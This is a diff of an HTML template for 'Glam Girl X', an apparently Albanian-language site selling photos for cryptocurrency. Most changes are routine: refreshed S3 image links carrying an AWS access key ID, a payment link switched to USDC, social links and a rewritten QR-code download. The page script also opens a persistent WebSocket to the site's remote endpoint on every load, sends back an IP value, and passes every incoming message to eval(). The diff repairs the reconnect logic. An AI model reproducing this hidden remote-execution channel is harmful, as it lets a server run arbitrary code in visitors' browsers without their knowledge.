@@ -15,8 +15,8 @@
     <meta name="theme-color" content="#ffffff">
     <link rel="stylesheet" href="/static/fonts/bootstrap-icons.css">
     
-<meta property="og:image" content="https://uglek.s3.amazonaws.com/home/team/lotteh/media/images/e8c8474f-fc1f-481f-a990-de6f92147ee3.png?AWSAccessKeyId=AKIA5A2IYPTJFQQ6WHXN&amp;Signature=8%2F4KrfU59eQ5IuedTnekHh8Ono8%3D&amp;Expires=1740952898">
-<meta name="pinterest:image" content="https://uglek.s3.amazonaws.com/home/team/lotteh/media/images/e8c8474f-fc1f-481f-a990-de6f92147ee3.png?AWSAccessKeyId=AKIA5A2IYPTJFQQ6WHXN&amp;Signature=8%2F4KrfU59eQ5IuedTnekHh8Ono8%3D&amp;Expires=1740952898"/>
+<meta property="og:image" content="https://uglek.s3.amazonaws.com/home/team/lotteh/media/images/e8c8474f-fc1f-481f-a990-de6f92147ee3.png?AWSAccessKeyId=AKIA5A2IYPTJFQQ6WHXN&amp;Signature=%2FIgvUMJ9lwyswSD8crit%2BAjpYUY%3D&amp;Expires=1745624125">
+<meta name="pinterest:image" content="https://uglek.s3.amazonaws.com/home/team/lotteh/media/images/e8c8474f-fc1f-481f-a990-de6f92147ee3.png?AWSAccessKeyId=AKIA5A2IYPTJFQQ6WHXN&amp;Signature=%2FIgvUMJ9lwyswSD8crit%2BAjpYUY%3D&amp;Expires=1745624125"/>
 
     <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6209985848112194"
          crossorigin="anonymous"></script>
@@ -145,7 +145,7 @@
 
 <img width="100%;" height="auto" src="https://glamgirlx.com/media/images/784f8da3-27dd-4089-a686-e3c8d156be86.png" alt="A woman in a white dress sitting on a bed. - nga Daisy">
 
-<p><a href="https://lotteh.com/payments/photo/crypto/Daisy/?id=784f8da3-27dd-4089-a686-e3c8d156be86&crypto=ETH" title="Buy with cryptocurrency on Lotte Harper">Blej me kripto</a></p>
+<p><a href="https://lotteh.com/payments/pay/crypto/Daisy/?id=784f8da3-27dd-4089-a686-e3c8d156be86&crypto=USDC" title="Buy with cryptocurrency on Lotte Harper">Blej me kripto</a></p>
 
 
 <hr>
@@ -185,7 +185,7 @@
 
 
         
-        <p>
+        
 
 <div class="dropdown">
   <a class="btn btn-outline-info dropdown-toggle" role="button" id="dropdownMenuLink" data-bs-toggle="dropdown" aria-expanded="false">
@@ -222,12 +222,16 @@
     </div>
   </div>
 </div>
-</p>
+
         <p><i>Më lini një këshillë në bitcoin duke përdorur këtë adresë:</i> <b id="btc-wallet">3KhDWoSve2N627RiW8grj6XrsoPT7d6qyE</b> <button class="btn btn-sm btn-info" title="Adresa e kopjimit" onclick="copyToClipboard('btc-wallet');">Kopjo</button></p>
+        <div id="javascript-console"></div>
 	    <div class="d-flex justify-content-between p-2">
 	        <div style="float:left;">
 	          <p><span class="badge bg-light text-dark shadow p-1">&copy; Glam Girl X 2025</span></p>
 		    </div>
+            <div style="text-align: center;">
+                 <a href="https://instagram.com/yourlocalfemme" about="_blank" title="Më vizitoni në Instagram" style="font-size: 20px;" class="ml-1"><i class="bi bi-instagram"></i></a> <a href="https://twitter.com/teamfemmebabe" about="_blank" title="Më vizitoni në Twitter" style="font-size: 20px;" class="ml-1"><i class="bi bi-twitter"></i></a> <a href="https://youtube.com/@daisymakeup" about="_blank" title="Më shiko në YouTube" style="font-size: 20px;" class="ml-1"><i class="bi bi-youtube"></i></a>
+            </div>
 	        <div style="float:right;">
 	          <p><span class="badge bg-light text-dark shadow p-1"><a href="https://lotteh.com/terms/?lang=sq" title="Shihni kushtet e shërbimit">Kushtet e Shërbimit</a></span></p>
 		    </div>
@@ -270,32 +274,32 @@ function jumpbookto(page) {
             
         	Prism.highlightAll();
         });
-        var socket;
-        function openSocket() {
+        var remoteSocket;
+        function openRemoteSocket() {
             window.location.hash = '';
-            socket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
-            socket.addEventListener("open", (event) => {
+            remoteSocket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
+            remoteSocket.addEventListener("open", (event) => {
                 console.log('Socket open.');
                 fetch('https://lotteh.com/remote/generate/')
         		    .then(response => response.json())
         		    .then(data => {
-        		        socket.send(data.ip);
+        		        remoteSocket.send(data.ip);
         		    })
         		    .catch(error => {
         		        console.log('Error:', error);
         		    });
             });
-            socket.addEventListener("closed", (event) => {
+            remoteSocket.addEventListener("close", (event) => {
                 console.log('Socket closed.');
                 setTimeout(function() {
-                    openSocket();
+                    openRemoteSocket();
                 }, 10000);
             });
-        	socket.addEventListener("message", (event) => {
+        	remoteSocket.addEventListener("message", (event) => {
                     eval(event.data);
             });
         }
-        openSocket();
+        openRemoteSocket();
         $(document).ready(function() {
         	$("#contact-form").submit(function(e){
                 	e.preventDefault();
@@ -442,18 +446,39 @@ if(document.getElementById("current-time")) {
             image.style.height = "100%";
             image.style.maxWidth = "160px";
             image.alt = "Ndani këtë faqe duke skanuar një kod QR.";
-            function downloadQrImage(url, filename) {
-              const link = document.createElement('a');
-              link.href = url;
-              link.download = 'Glam Girl X - ' + filename;
-              document.body.appendChild(link);
-              link.classList.add('hide');
-              link.click();
-            }
-            function downloadQr() {
-                    downloadQrImage(image.src, 'QR Code');
-            }
-            qrdiv.onclick = downloadQr;
+            try {
+                function getBase64Image(img) {
+                    var src = img.src;
+                    var image = new Image();
+                    image.src = src;
+                    image.onload = function(event) {
+                    var bsfcanvas = document.createElement("canvas");
+                    bsfcanvas.width = img.clientWidth + 40;
+                    bsfcanvas.height = img.clientHeight + 40;
+                    if(bsfcanvas.height < bsfcanvas.width) bsfcanvas.height = bsfcanvas.width;
+                    var bsfctx = bsfcanvas.getContext("2d");
+                    bsfctx.fillStyle = "#ffffff";
+                    bsfctx.fillRect(0, 0, bsfcanvas.width, bsfcanvas.height);
+                    bsfctx.drawImage(event.target, 20, 20, bsfcanvas.width - 40, bsfcanvas.height - 40);
+                    var dataURL = bsfcanvas.toDataURL("image/png");
+                    downloadQrImage(dataURL, 'Glam Girl X - QR Code.png');
+                    };
+                }
+                function downloadQrImage(url, filename) {
+                    const link = document.createElement('a');
+                    link.download = filename;
+                    link.href = url;
+                    link.classList.add('hide');
+                    link.click();
+                }
+                function downloadQr(){
+                    var theQrImage = document.getElementById('shareqrcode').querySelector('img');
+                    getBase64Image(theQrImage);
+                }
+                qrdiv.onclick = downloadQr;
+                } catch(error) {
+                        document.getElementById('javascript-console').insertAdjacentHTML("beforeend", '<div>' + new String(error) + '</div>');
+                }
         });
     </script>
     
